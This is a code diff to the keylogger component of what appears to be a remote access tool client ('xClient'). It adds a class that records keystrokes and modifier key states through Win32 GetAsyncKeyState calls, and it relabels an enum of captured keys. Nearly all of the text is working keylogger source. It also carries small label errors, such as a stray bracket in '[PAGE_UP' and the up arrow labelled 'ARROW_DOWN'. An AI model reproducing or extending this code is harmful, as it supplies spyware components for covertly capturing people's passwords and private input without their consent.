@@ -12,6 +12,46 @@ using System.Text;
 namespace xClient.Core.Keylogger
 {
     /// <summary>
+    /// The main object that stores both the pressed key at a specific time
+    /// and the modifier keys that go along with the pressed key.
+    /// </summary>
+    public class LoggedKey
+    {
+        /// <summary>
+        /// A data type that is used for storing values regarding the states of
+        /// modifier keys at a given time.
+        /// </summary>
+        public struct KeyloggerModifierKeys
+        {
+            public bool ShiftKeyPressed { get; set; }
+            public bool AltKeyPressed { get; set; }
+            public bool CtrlKeyPressed { get; set; }
+
+            public bool CapsLock { get; set; }
+            public bool NumLock { get; set; }
+            public bool ScrollLock { get; set; }
+        }
+
+        public KeyloggerKeys PressedKey { get; set; }
+        public KeyloggerModifierKeys ModifierKeys { get; private set; }
+
+        public void RecordModifierKeys()
+        {
+            ModifierKeys = new KeyloggerModifierKeys()
+            {
+                // Modifier keys that are pressed:
+                CtrlKeyPressed = Win32.GetAsyncKeyState(KeyloggerKeys.VK_CONTROL).IsKeyPressed(),
+                AltKeyPressed = Win32.GetAsyncKeyState(KeyloggerKeys.VK_MENU).IsKeyPressed(),
+                ShiftKeyPressed = Win32.GetAsyncKeyState(KeyloggerKeys.VK_SHIFT).IsKeyPressed(),
+                // Modifier keys that have a state (toggle 'on' or 'off').
+                CapsLock = Win32.GetAsyncKeyState(KeyloggerKeys.VK_CAPITAL).IsKeyToggled(),
+                NumLock = Win32.GetAsyncKeyState(KeyloggerKeys.VK_NUMLOCK).IsKeyToggled(),
+                ScrollLock = Win32.GetAsyncKeyState(KeyloggerKeys.VK_SCROLL).IsKeyToggled()
+            };
+        }
+    }
+
+    /// <summary>
     /// Contains various keys that the keylogger supports.
     /// </summary>
     // Add Flags attribute so we can treat these as elements
@@ -51,163 +91,163 @@ namespace xClient.Core.Keylogger
         /// <summary>
         /// Control-break processing.
         /// </summary>
-        [KeyloggerKey("[CANCEL]", true)]
+        [KeyloggerKey("CANCEL", true)]
         VK_CANCEL = 0x03,
        
         /// <summary>
         /// BACKSPACE key.
         /// </summary>
-        [KeyloggerKey("[BACKSPACE]", true)]
+        [KeyloggerKey("BACKSPACE", true)]
         VK_BACK = 0x08,
 
         /// <summary>
         /// TAB key.
         /// </summary>
-        [KeyloggerKey("[TAB]", true)]
+        [KeyloggerKey("TAB", true)]
         VK_TAB = 0x09,
 
         /// <summary>
         /// CLEAR key.
         /// </summary>
-        [KeyloggerKey("[CLEAR]", true)]
+        [KeyloggerKey("CLEAR", true)]
         VK_CLEAR = 0x0C,
 
         /// <summary>
         /// ENTER key.
         /// </summary>
-        [KeyloggerKey("[ENTER]", true)]
+        [KeyloggerKey("ENTER", true)]
         VK_RETURN = 0x0D,
 
         /// <summary>
         /// SHIFT key.
         /// </summary>
-        [KeyloggerKey("[SHIFT]", true)]
+        [KeyloggerKey("SHIFT", true)]
         VK_SHIFT = 0x10,
 
         /// <summary>
         /// CONTROL (CTRL) key.
         /// </summary>
-        [KeyloggerKey("[CTRL]", true)]
+        [KeyloggerKey("CTRL", true)]
         VK_CONTROL = 0x11,
 
         /// <summary>
         /// ALT key.
         /// </summary>
-        [KeyloggerKey("[ALT]", true)]
+        [KeyloggerKey("ALT", true)]
         VK_MENU = 0x12,
 
         /// <summary>
         /// PAUSE key.
         /// </summary>
-        [KeyloggerKey("[PAUSE]", true)]
+        [KeyloggerKey("PAUSE", true)]
         VK_PAUSE = 0x13,
 
         /// <summary>
         /// CAPS LOCK key.
         /// </summary>
-        [KeyloggerKey("[CAPS]", true)]
+        [KeyloggerKey("CAPS", true)]
         VK_CAPITAL = 0x14,
 
         /// <summary>
         /// ESC key.
         /// </summary>
-        [KeyloggerKey("[ESC]", true)]
+        [KeyloggerKey("ESC", true)]
         VK_ESCAPE = 0x1B,
 
         /// <summary>
         /// SPACEBAR key.
         /// </summary>
-        [KeyloggerKey("[SPACE]", true)]
+        [KeyloggerKey("SPACE", true)]
         VK_SPACE = 0x20,
 
         /// <summary>
         /// PAGE UP key.
         /// </summary>
-        [KeyloggerKey("[PAGE_UP]", true)]
+        [KeyloggerKey("[PAGE_UP", true)]
         VK_PRIOR = 0x21,
 
         /// <summary>
         /// PAGE DOWN key.
         /// </summary>
-        [KeyloggerKey("[PAGE_DOWN]", true)]
+        [KeyloggerKey("PAGE_DOWN", true)]
         VK_NEXT = 0x22,
 
         /// <summary>
         /// END key.
         /// </summary>
-        [KeyloggerKey("[END]", true)]
+        [KeyloggerKey("END", true)]
         VK_END = 0x23,
 
         /// <summary>
         /// HOME key.
         /// </summary>
-        [KeyloggerKey("[HOME]", true)]
+        [KeyloggerKey("HOME", true)]
         VK_HOME = 0x24,
 
         /// <summary>
         /// LEFT ARROW key.
         /// </summary>
-        [KeyloggerKey("[ARROW_LEFT]", true)]
+        [KeyloggerKey("ARROW_LEFT", true)]
         VK_LEFT = 0x25,
 
         /// <summary>
         /// UP ARROW key.
         /// </summary>
-        [KeyloggerKey("[ARROW_DOWN]", true)]
+        [KeyloggerKey("ARROW_DOWN", true)]
         VK_UP = 0x26,
 
         /// <summary>
         /// RIGHT ARROW key.
         /// </summary>
-        [KeyloggerKey("[ARROW_RIGHT]", true)]
+        [KeyloggerKey("ARROW_RIGHT", true)]
         VK_RIGHT = 0x27,
 
         /// <summary>
         /// DOWN ARROW key.
         /// </summary>
-        [KeyloggerKey("[ARROW_DOWN]", true)]
+        [KeyloggerKey("ARROW_DOWN", true)]
         VK_DOWN = 0x28,
 
         /// <summary>
         /// SELECT key.
         /// </summary>
-        [KeyloggerKey("[SELECT]", true)]
+        [KeyloggerKey("SELECT", true)]
         VK_SELECT = 0x29,
 
         /// <summary>
         /// PRINT key.
         /// </summary>
-        [KeyloggerKey("[PRINT]", true)]
+        [KeyloggerKey("PRINT", true)]
         VK_PRINT = 0x2A,
 
         /// <summary>
         /// EXECUTE key.
         /// </summary>
-        [KeyloggerKey("[EXECUTE]", true)]
+        [KeyloggerKey("EXECUTE", true)]
         VK_EXECUTE = 0x2B,
 
         /// <summary>
         /// PRINT SCREEN key.
         /// </summary>
-        [KeyloggerKey("[PRINT_SCREEN]", true)]
+        [KeyloggerKey("PRINT_SCREEN", true)]
         VK_SNAPSHOT = 0x2C,
 
         /// <summary>
         /// INSERT (INS) key.
         /// </summary>
-        [KeyloggerKey("[INSERT]", true)]
+        [KeyloggerKey("INSERT", true)]
         VK_INSERT = 0x2D,
 
         /// <summary>
         /// DELETE (DEL) key.
         /// </summary>
-        [KeyloggerKey("[DEL]", true)]
+        [KeyloggerKey("DEL", true)]
         VK_DELETE = 0x2E,
 
         /// <summary>
         /// HELP key.
         /// </summary>
-        [KeyloggerKey("[HELP]", true)]
+        [KeyloggerKey("HELP", true)]
         VK_HELP = 0x2F,
 
         #endregion
